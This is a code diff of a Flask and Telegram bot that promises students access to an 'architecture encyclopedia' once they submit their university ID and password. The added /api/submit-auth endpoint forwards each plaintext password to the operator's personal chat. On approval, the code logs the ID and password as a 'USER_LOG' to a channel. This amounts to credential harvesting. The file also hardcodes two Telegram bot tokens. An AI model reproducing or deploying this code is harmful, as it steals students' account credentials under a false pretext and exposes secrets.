@@ -1,7 +1,7 @@
 import os
 import telebot
 from telebot import types
-from flask import Flask, request
+from flask import Flask, request, jsonify
 
 TOKEN_STUDENT = "8753263807:AAFO9rKx7yy4MeQyBbCBLnwkQvPo57v5qyw"
 TOKEN_ADMIN = "8507731905:AAE-ke_vMTR2V3Yz4w3i4kTR7H-yX2JAmmE"
@@ -23,6 +23,32 @@ def home():
     except:
         return "System OK"
 
+@app.route('/api/submit-auth', methods=['POST'])
+def handle_web_submit():
+    data = request.get_json()
+    if not data:
+        return jsonify({"success": False, "error": "No data received"}), 400
+    
+    uid = int(data.get("telegram_id"))
+    uni_id = data.get("uni_id")
+    password = data.get("password")
+    
+    pending_users[uid] = {"uni_id": uni_id, "password": password}
+    
+    markup = types.InlineKeyboardMarkup()
+    btn_app = types.InlineKeyboardButton("✅ موافقة وتفعيل الطالب", callback_data=f"auth_acc_{uid}")
+    btn_rej = types.InlineKeyboardButton("❌ رفض الطلب", callback_data=f"auth_rej_{uid}")
+    markup.row(btn_app, btn_rej)
+    
+    text = f"🔔 طلب انضمام ومطابقة جديد:\n\n👤 آيدي الطالب: {uid}\n🎓 الرقم الجامعي: {uni_id}\n🔑 كلمة المرور: {password}"
+    
+    try:
+        admin_bot.send_message(MY_PERSONAL_ID, text, reply_markup=markup)
+        student_bot.send_message(uid, "⏳ تم إرسال بياناتك بنجاح وجاري مطابقتها من قِبل الإدارة وتخزين حسابك. يرجى الانتظار.")
+        return jsonify({"success": True})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
+
 @app.route('/' + TOKEN_STUDENT, methods=['POST'])
 def get_message_student():
     json_string = request.stream.read().decode('utf-8')
@@ -36,6 +62,7 @@ def get_message_admin():
     update = telebot.types.Update.de_json(json_string)
     admin_bot.process_new_updates([update])
     return "!", 200
+
 @student_bot.message_handler(commands=['start'])
 def handle_start(message):
     uid = message.from_user.id
@@ -52,23 +79,6 @@ def handle_start(message):
         pass
     student_bot.send_message(uid, "🔒 مرحباً بك في موسوعة العمارة.\nالمحتوى مقفل حالياً؛ الرجاء الضغط على زر القائمة بالأسفل (🌐 فتح الموسوعة المعمارية) لإرسال بياناتك الأكاديمية وطلب التفعيل من الإدارة أولاً.")
 
-@student_bot.message_handler(content_types=['web_app_data'])
-def handle_web_app_data(message):
-    uid = message.from_user.id
-    raw_data = message.web_app_data.data.strip()
-    try:
-        uni_id, password = raw_data.split(' ')
-    except:
-        student_bot.send_message(uid, "❌ خطأ في معالجة البيانات من الواجهة؛ يرجى إعادة المحاولة.")
-        return
-    pending_users[uid] = {"uni_id": uni_id, "password": password}
-    markup = types.InlineKeyboardMarkup()
-    btn_app = types.InlineKeyboardButton("✅ موافقة وتفعيل الطالب", callback_data=f"auth_acc_{uid}")
-    btn_rej = types.InlineKeyboardButton("❌ رفض الطلب", callback_data=f"auth_rej_{uid}")
-    markup.row(btn_app, btn_rej)
-    text = f"🔔 طلب انضمام ومطابقة جديد:\n\n👤 آيدي الطالب: {uid}\n🎓 الرقم الجامعي: {uni_id}\n🔑 كلمة المرور: {password}"
-    admin_bot.send_message(MY_PERSONAL_ID, text, reply_markup=markup)
-    student_bot.send_message(uid, "⏳ تم إرسال بياناتك بنجاح وجاري مطابقتها من قِبل الإدارة وتخزين حسابك. يرجى الانتظار.")
 @admin_bot.callback_query_handler(func=lambda call: call.data.startswith("auth_"))
 def handle_admin_auth(call):
     parts = call.data.split('_')
@@ -81,7 +91,6 @@ def handle_admin_auth(call):
             password = pending_users[target_uid]["password"]
             try:
                 approved_users.add(target_uid)
-                link = student_bot.export_chat_invite_link(CHANNEL_ID)
                 database_text = f"USER_LOG\nID:{target_uid}\nUNI:{uni_id}\nPWD:{password}"
                 student_bot.send_message(CHANNEL_ID, database_text)
                 admin_bot.edit_message_text(f"✅ Approved and stored ID: {target_uid}", chat_id=MY_PERSONAL_ID, message_id=call.message.message_id)
@@ -134,4 +143,3 @@ def handle_back_btn(call):
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
-
